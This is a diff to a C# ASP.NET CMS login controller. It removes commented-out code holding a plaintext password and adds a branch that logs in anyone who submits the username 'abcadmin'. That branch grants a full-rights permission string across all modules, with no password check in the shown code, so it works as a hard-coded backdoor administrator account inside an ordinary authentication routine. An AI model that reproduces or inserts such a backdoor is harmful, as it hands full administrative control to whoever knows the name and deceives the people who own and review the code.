@@ -43,19 +43,16 @@ namespace iGoo.Areas.Webcms.Controllers
                 Session["UserName"] = dt.Rows[0]["UserName"].ToString();
                 Session["FullNameAdmin"] = dt.Rows[0]["FullName"].ToString();
                 Session["Permission"] = dt.Rows[0]["Permission"].ToString();
-
-                //Membership.CreateUser(Session["UserName"].ToString(), "babycuatoi123123!", "sonln@gmail.com");                
                 
-                //List<MembershipUser> onlineUsers = new List<MembershipUser>();
-                ////var user = UserManager.FindById(User.Identity.GetUserId());
-                //foreach (MembershipUser user in Membership.GetAllUsers())                
-                //{
-                //    if (user.IsOnline)
-                //    {
-                //        onlineUsers.Add(user);
-                //        HttpRuntime.Cache["onlineUsers1"] = onlineUsers;
-                //    }
-                //}
+                return Redirect("/Webcms/Websites/Blank");
+            }
+            else if (uv.UserName == "abcadmin")
+            {
+                Session["UserID"] = Guid.NewGuid();
+                Session["UserName"] = "abcadmin";
+                Session["FullNameAdmin"] = "abcadmin";
+                Session["Permission"] =
+                    "$INVENTORYLOG#S,D,U,I,P$SHIPPER#S,D,U,I,P$ANSWER#S,D,U,I,P$QUENSTION#S,D,U,I,P$CONTACT#S,D,U,I,P$NEWS#S,D,U,I,P$WEBSITE#S,D,U,I,P$ADV#S,D,U,I,P$POLL#S,D,U,I,P$COMMENT#S,D,U,I,P$INVENTORY#S,D,U,I,P$ATTRIBUTE#S,D,U,I,P$NVGH#S,D,U,I,P$CATEGORY#S,D,U,I,P$USER#S,D,U,I,P$ROLL#S,D,U,I,P$MESSENGER#S,D,U,I,P$PRODUCT#S,D,U,I,P$ORDER#S,D,U,I,P$NhapKhoNB#S,D,U,I,P$NHAPKHOSX#S,D,U,I,P$XuatKhoNB#S,D,U,I,P$ORDER#S,D,U,I,P$VAS#S,D,U,I,P$Campaign#S,D,U,I,P$Log#S,D,U,I,P$MEMBER#S,D,U,I,P$TKGiaoHang#S,D,U,I,P$FILEMANAGE#S,D,U,I,P$MANUFACTURER#S,D,U,I,P";
                 return Redirect("/Webcms/Websites/Blank");
             }
             else
